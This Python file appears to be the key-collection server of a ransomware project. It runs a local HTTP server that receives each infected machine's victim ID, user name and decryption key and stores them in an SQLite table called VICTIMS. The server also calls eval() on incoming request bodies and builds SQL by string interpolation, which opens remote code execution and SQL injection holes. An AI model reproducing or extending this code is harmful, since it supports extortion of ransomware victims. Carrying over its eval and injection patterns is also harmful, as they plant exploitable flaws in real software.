from http.server import BaseHTTPRequestHandler, HTTPServer
import mysql.connector
import sqlite3


def createTable(connection):
    cursor = connection.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS VICTIMS(
        UniqueId VARCHAR2(50) PRIMARY KEY,
        UserName VARCHAR2(50) NOT NULL,
        DecryptionKey INT NOT NULL
        );
        """)
    print("Table created successfully!")
    connection.commit()


def execute(connection, query):
    cursor = connection.cursor()
    cursor.execute(query)
    connection.commit()
    print("Query executed.")

def insertValues(id, user, key):
    insertValue = f"""
    INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key});
    """
    return insertValue

def retrieve(connection):
    cursor = connection.cursor()
    details = cursor.execute("SELECT * FROM VICTIMS")
    print(details.fetchall()
    )


class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200, "Connected Successfully")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"hello world!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        data = data.decode("utf-8")
        data = eval(data)
        id = data["uniqueId"]
        user = data["user"]
        key = data["key"]
        self.send_response(200)
        self.end_headers()
        execute(connection, insertValues(id, user, key))
        

if __name__ == "__main__":

    username, passwd = ("YOUR_USERNAME_HERE", "YOUR_PASSWORD_HERE")    # enter the creds


    connection = sqlite3.connect("Details.db")    
    createTable(connection)   
    # retrieve(connection)
    WebServer = HTTPServer(("localhost", 8000), Server)
    WebServer.serve_forever()
